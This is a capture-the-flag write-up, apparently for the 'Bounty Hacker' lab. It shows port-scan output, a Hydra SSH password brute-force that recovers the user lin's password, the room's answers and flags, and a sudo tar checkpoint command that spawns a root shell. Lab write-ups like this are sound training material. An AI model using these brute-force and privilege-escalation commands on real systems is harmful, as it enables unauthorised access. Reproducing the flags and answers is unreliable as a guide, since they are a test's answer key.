# Bounty Hacker

## Notes

```
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/gabriel/snap/rustscan/28/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.51.26:21
Open 10.10.51.26:22
Open 10.10.51.26:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] 
Starting Nmap 7.60 ( https://nmap.org ) at 2021-04-08 21:54 BST
NSE: Loaded 146 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 21:54
Completed NSE at 21:54, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 21:54
Completed NSE at 21:54, 0.00s elapsed
Initiating Ping Scan at 21:54
Scanning 10.10.51.26 [2 ports]
Completed Ping Scan at 21:54, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 21:54
Completed Parallel DNS resolution of 1 host. at 21:54, 0.03s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 21:54
Scanning 10.10.51.26 [3 ports]
Discovered open port 21/tcp on 10.10.51.26
Discovered open port 22/tcp on 10.10.51.26
Discovered open port 80/tcp on 10.10.51.26
Completed Connect Scan at 21:54, 0.06s elapsed (3 total ports)
Initiating Service scan at 21:54
Scanning 3 services on 10.10.51.26
Completed Service scan at 21:54, 6.14s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.51.26.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 21:54
NSE: [ftp-bounce 10.10.51.26:21] PORT response: 500 Illegal PORT command.
NSE Timing: About 99.75% done; ETC: 21:54 (0:00:00 remaining)
Completed NSE at 21:54, 30.98s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 21:54
Completed NSE at 21:54, 0.00s elapsed
Nmap scan report for 10.10.51.26
Host is up, received syn-ack (0.040s latency).
Scanned at 2021-04-08 21:54:15 BST for 38s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.32.89
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 6
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCgcwCtWTBLYfcPeyDkCNmq6mXb/qZExzWud7PuaWL38rUCUpDu6kvqKMLQRHX4H3vmnPE/YMkQIvmz4KUX4H/aXdw0sX5n9jrennTzkKb/zvqWNlT6zvJBWDDwjv5g9d34cMkE9fUlnn2gbczsmaK6Zo337F40ez1iwU0B39e5XOqhC37vJuqfej6c/C4o5FcYgRqktS/kdcbcm7FJ+fHH9xmUkiGIpvcJu+E4ZMtMQm4bFMTJ58bexLszN0rUn17d2K4+lHsITPVnIxdn9hSc3UomDrWWg+hWknWDcGpzXrQjCajO395PlZ0SBNDdN+B14E0m6lRY9GlyCD9hvwwB
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMCu8L8U5da2RnlmmnGLtYtOy0Km3tMKLqm4dDG+CraYh7kgzgSVNdAjCOSfh3lIq9zdwajW+1q9kbbICVb07ZQ=
|   256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (EdDSA)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICqmJn+c7Fx6s0k8SCxAJAoJB7pS/RRtWjkaeDftreFw
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 21:54
Completed NSE at 21:54, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 21:54
Completed NSE at 21:54, 0.00s elapsed
Read data files from: /snap/rustscan/28/usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.89 seconds
```

```
hydra 10.10.51.26 -l lin -P locks.txt ssh -V
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-08 21:59:06
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.51.26:22/
[ATTEMPT] target 10.10.51.26 - login "lin" - pass "rEddrAGON" - 1 of 26 [child 0] (0/0)
[ATTEMPT] target 10.10.51.26 - login "lin" - pass "ReDdr4g0nSynd!cat3" - 2 of 26 [child 1] (0/0)
[ATTEMPT] target 10.10.51.26 - login "lin" - pass "Dr@gOn$yn9icat3" - 3 of 26 [child 2] (0/0)
[ATTEMPT] target 10.10.51.26 - login "lin" - pass "R3DDr46ONSYndIC@Te" - 4 of 26 [child 3] (0/0)
[ATTEMPT] target 10.10.51.26 - login "lin" - pass "ReddRA60N" - 5 of 26 [child 4] (0/0)
[ATTEMPT] target 10.10.51.26 - login "lin" - pass "R3dDrag0nSynd1c4te" - 6 of 26 [child 5] (0/0)
[ATTEMPT] target 10.10.51.26 - login "lin" - pass "dRa6oN5YNDiCATE" - 7 of 26 [child 6] (0/0)
[ATTEMPT] target 10.10.51.26 - login "lin" - pass "ReDDR4g0n5ynDIc4te" - 8 of 26 [child 7] (0/0)
[ATTEMPT] target 10.10.51.26 - login "lin" - pass "R3Dr4gOn2044" - 9 of 26 [child 8] (0/0)
[ATTEMPT] target 10.10.51.26 - login "lin" - pass "RedDr4gonSynd1cat3" - 10 of 26 [child 9] (0/0)
[ATTEMPT] target 10.10.51.26 - login "lin" - pass "R3dDRaG0Nsynd1c@T3" - 11 of 26 [child 10] (0/0)
[ATTEMPT] target 10.10.51.26 - login "lin" - pass "Synd1c4teDr@g0n" - 12 of 26 [child 11] (0/0)
[ATTEMPT] target 10.10.51.26 - login "lin" - pass "reddRAg0N" - 13 of 26 [child 12] (0/0)
[ATTEMPT] target 10.10.51.26 - login "lin" - pass "REddRaG0N5yNdIc47e" - 14 of 26 [child 13] (0/0)
[ATTEMPT] target 10.10.51.26 - login "lin" - pass "Dra6oN$yndIC@t3" - 15 of 26 [child 14] (0/0)
[ATTEMPT] target 10.10.51.26 - login "lin" - pass "4L1mi6H71StHeB357" - 16 of 26 [child 15] (0/0)
[ATTEMPT] target 10.10.51.26 - login "lin" - pass "rEDdragOn$ynd1c473" - 17 of 27 [child 15] (0/1)
[22][ssh] host: 10.10.51.26   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-08 21:59:09

```
**Questions**

    1. Who wrote the task list? 

lin

    2. What service can you bruteforce with the text file found?

ssh

    3. What is the users password? 

RedDr4gonSynd1cat3

    4. user.txt

THM{CR1M3_SyNd1C4T3}

    5. root.txt

THM{80UN7Y_h4cK3r}

Manual enumeration with `sudo -l` found that tar could be ran with sudo permissions. This can be abused to keep the elevated permissions with the command:
`sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash`
